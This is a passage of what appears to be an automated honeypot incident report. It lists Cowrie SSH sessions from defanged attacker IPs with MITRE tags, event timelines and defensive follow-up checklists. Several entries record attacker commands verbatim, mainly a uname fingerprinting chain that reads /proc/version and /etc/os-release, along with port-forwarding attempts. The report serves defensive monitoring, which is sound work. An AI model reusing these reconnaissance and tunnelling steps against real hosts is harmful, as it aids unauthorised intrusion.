| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:57:46` | `cowrie.session.connect` |
| `2026-08-04 11:57:47` | `cowrie.client.version` |
| `2026-08-04 11:57:48` | `cowrie.client.kex` |
| `2026-08-04 11:57:49` | `cowrie.login.success` |
| `2026-08-04 11:57:50` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f662dcd69563

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 12:00 |
| **Last Seen** | 2026-08-04 12:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:00:56` | `cowrie.session.connect` |
| `2026-08-04 12:00:56` | `cowrie.client.version` |
| `2026-08-04 12:00:56` | `cowrie.client.kex` |
| `2026-08-04 12:00:57` | `cowrie.login.success` |
| `2026-08-04 12:00:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:00:57` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e548b09d0e6d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 12:02 |
| **Last Seen** | 2026-08-04 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:02:02` | `cowrie.session.connect` |
| `2026-08-04 12:02:02` | `cowrie.client.version` |
| `2026-08-04 12:02:02` | `cowrie.client.kex` |
| `2026-08-04 12:02:03` | `cowrie.login.success` |
| `2026-08-04 12:02:03` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:02:03` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46820899985f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:04 |
| **Last Seen** | 2026-08-04 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:04:36` | `cowrie.session.connect` |
| `2026-08-04 12:04:36` | `cowrie.client.version` |
| `2026-08-04 12:04:36` | `cowrie.client.kex` |
| `2026-08-04 12:04:36` | `cowrie.login.success` |
| `2026-08-04 12:04:37` | `cowrie.session.params` |
| `2026-08-04 12:04:37` | `cowrie.command.input` |
| `2026-08-04 12:04:37` | `cowrie.log.closed` |
| `2026-08-04 12:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1d3057771d9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:06 |
| **Last Seen** | 2026-08-04 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:06:18` | `cowrie.session.connect` |
| `2026-08-04 12:06:18` | `cowrie.client.version` |
| `2026-08-04 12:06:18` | `cowrie.client.kex` |
| `2026-08-04 12:06:18` | `cowrie.login.success` |
| `2026-08-04 12:06:19` | `cowrie.session.params` |
| `2026-08-04 12:06:19` | `cowrie.command.input` |
| `2026-08-04 12:06:19` | `cowrie.log.closed` |
| `2026-08-04 12:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5905dd7559f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:06 |
| **Last Seen** | 2026-08-04 12:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:06:25` | `cowrie.session.connect` |
| `2026-08-04 12:06:26` | `cowrie.client.version` |
| `2026-08-04 12:06:26` | `cowrie.client.kex` |
| `2026-08-04 12:06:27` | `cowrie.login.success` |
| `2026-08-04 12:06:29` | `cowrie.session.params` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.success` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:29` | `cowrie.command.input` |
| `2026-08-04 12:06:30` | `cowrie.log.closed` |
| `2026-08-04 12:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51b0831edaba

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:07 |
| **Last Seen** | 2026-08-04 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:07:54` | `cowrie.session.connect` |
| `2026-08-04 12:07:54` | `cowrie.client.version` |
| `2026-08-04 12:07:54` | `cowrie.client.kex` |
| `2026-08-04 12:07:54` | `cowrie.login.success` |
| `2026-08-04 12:07:55` | `cowrie.session.params` |
| `2026-08-04 12:07:55` | `cowrie.command.input` |
| `2026-08-04 12:07:55` | `cowrie.log.closed` |
| `2026-08-04 12:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46bbecdecb15

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:08 |
| **Last Seen** | 2026-08-04 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:08:02` | `cowrie.session.connect` |
| `2026-08-04 12:08:02` | `cowrie.client.version` |
| `2026-08-04 12:08:02` | `cowrie.client.kex` |
| `2026-08-04 12:08:04` | `cowrie.login.success` |
| `2026-08-04 12:08:05` | `cowrie.session.params` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.success` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:05` | `cowrie.command.input` |
| `2026-08-04 12:08:06` | `cowrie.log.closed` |
| `2026-08-04 12:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac011c21074

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:09 |
| **Last Seen** | 2026-08-04 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:09:30` | `cowrie.session.connect` |
| `2026-08-04 12:09:30` | `cowrie.client.version` |
| `2026-08-04 12:09:30` | `cowrie.client.kex` |
| `2026-08-04 12:09:30` | `cowrie.login.success` |
| `2026-08-04 12:09:31` | `cowrie.session.params` |
| `2026-08-04 12:09:31` | `cowrie.command.input` |
| `2026-08-04 12:09:32` | `cowrie.log.closed` |
| `2026-08-04 12:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35ed3e1026b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 12:09 |
| **Last Seen** | 2026-08-04 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:09:38` | `cowrie.session.connect` |
| `2026-08-04 12:09:38` | `cowrie.client.version` |
| `2026-08-04 12:09:38` | `cowrie.client.kex` |
| `2026-08-04 12:09:39` | `cowrie.login.success` |
| `2026-08-04 12:09:39` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:09:39` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a578b73280

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:09 |
| **Last Seen** | 2026-08-04 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:09:40` | `cowrie.session.connect` |
| `2026-08-04 12:09:40` | `cowrie.client.version` |
| `2026-08-04 12:09:40` | `cowrie.client.kex` |
| `2026-08-04 12:09:42` | `cowrie.login.success` |
| `2026-08-04 12:09:43` | `cowrie.session.params` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.success` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:43` | `cowrie.command.input` |
| `2026-08-04 12:09:44` | `cowrie.log.closed` |
| `2026-08-04 12:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ef3e444490

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:11 |
| **Last Seen** | 2026-08-04 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:11:07` | `cowrie.session.connect` |
| `2026-08-04 12:11:07` | `cowrie.client.version` |
| `2026-08-04 12:11:07` | `cowrie.client.kex` |
| `2026-08-04 12:11:08` | `cowrie.login.success` |
| `2026-08-04 12:11:08` | `cowrie.session.params` |
| `2026-08-04 12:11:08` | `cowrie.command.input` |
| `2026-08-04 12:11:09` | `cowrie.log.closed` |
| `2026-08-04 12:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524f5562726f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:11 |
| **Last Seen** | 2026-08-04 12:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:11:20` | `cowrie.session.connect` |
| `2026-08-04 12:11:20` | `cowrie.client.version` |
| `2026-08-04 12:11:20` | `cowrie.client.kex` |
| `2026-08-04 12:11:22` | `cowrie.login.success` |
| `2026-08-04 12:11:24` | `cowrie.session.params` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.success` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:24` | `cowrie.command.input` |
| `2026-08-04 12:11:25` | `cowrie.log.closed` |
| `2026-08-04 12:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91f073df83df

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-04 12:11 |
| **Last Seen** | 2026-08-04 12:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:11:53` | `cowrie.session.connect` |
| `2026-08-04 12:11:53` | `cowrie.client.version` |
| `2026-08-04 12:11:53` | `cowrie.client.kex` |
| `2026-08-04 12:11:53` | `cowrie.login.success` |
| `2026-08-04 12:11:53` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:11:53` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f3b31ac66e1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:12 |
| **Last Seen** | 2026-08-04 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:12:41` | `cowrie.session.connect` |
| `2026-08-04 12:12:41` | `cowrie.client.version` |
| `2026-08-04 12:12:41` | `cowrie.client.kex` |
| `2026-08-04 12:12:42` | `cowrie.login.success` |
| `2026-08-04 12:12:43` | `cowrie.session.params` |
| `2026-08-04 12:12:43` | `cowrie.command.input` |
| `2026-08-04 12:12:43` | `cowrie.log.closed` |
| `2026-08-04 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f938ee1f5726

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:12 |
| **Last Seen** | 2026-08-04 12:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:12:59` | `cowrie.session.connect` |
| `2026-08-04 12:12:59` | `cowrie.client.version` |
| `2026-08-04 12:12:59` | `cowrie.client.kex` |
| `2026-08-04 12:13:01` | `cowrie.login.success` |
| `2026-08-04 12:13:03` | `cowrie.session.params` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.success` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:03` | `cowrie.command.input` |
| `2026-08-04 12:13:04` | `cowrie.log.closed` |
| `2026-08-04 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c1c099ccfe7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:14 |
| **Last Seen** | 2026-08-04 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:14:12` | `cowrie.session.connect` |
| `2026-08-04 12:14:12` | `cowrie.client.version` |
| `2026-08-04 12:14:12` | `cowrie.client.kex` |
| `2026-08-04 12:14:12` | `cowrie.login.success` |
| `2026-08-04 12:14:13` | `cowrie.session.params` |
| `2026-08-04 12:14:13` | `cowrie.command.input` |
| `2026-08-04 12:14:13` | `cowrie.log.closed` |
| `2026-08-04 12:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30e9da1223b

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-08-04 12:14 |
| **Last Seen** | 2026-08-04 12:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:14:54` | `cowrie.session.connect` |
| `2026-08-04 12:14:55` | `cowrie.client.version` |
| `2026-08-04 12:14:55` | `cowrie.client.kex` |
| `2026-08-04 12:14:58` | `cowrie.login.success` |
| `2026-08-04 12:14:59` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81972ab4dade

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:15 |
| **Last Seen** | 2026-08-04 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:15:44` | `cowrie.session.connect` |
| `2026-08-04 12:15:44` | `cowrie.client.version` |
| `2026-08-04 12:15:44` | `cowrie.client.kex` |
| `2026-08-04 12:15:45` | `cowrie.login.success` |
| `2026-08-04 12:15:46` | `cowrie.session.params` |
| `2026-08-04 12:15:46` | `cowrie.command.input` |
| `2026-08-04 12:15:46` | `cowrie.log.closed` |
| `2026-08-04 12:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85c7f8540dc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:16 |
| **Last Seen** | 2026-08-04 12:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:16:24` | `cowrie.session.connect` |
